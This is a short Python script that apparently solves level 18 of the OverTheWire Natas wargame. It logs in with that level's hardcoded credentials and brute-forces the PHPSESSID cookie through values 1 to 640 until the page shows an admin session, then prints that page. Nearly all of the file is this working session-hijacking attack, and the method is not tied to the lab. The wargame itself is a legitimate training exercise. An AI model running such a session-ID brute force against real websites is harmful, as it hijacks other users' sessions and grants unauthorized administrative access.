import requests
import re

username = "natas18"
password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
url = 'http://%s.natas.labs.overthewire.org/' % username

session = requests.Session()

for session_id in range(1,641):
    response = session.get(url,cookies={"PHPSESSID":str(session_id)},auth=(username,password))
# response = session.post(url,data={"username":"Nimesh","password":"subscribe"},auth=(username,password))
    content = response.text

    if("You are an admin" in content):
        print("Got it",session_id)
        print(content)
        break
    else:
        print("trying",session_id)
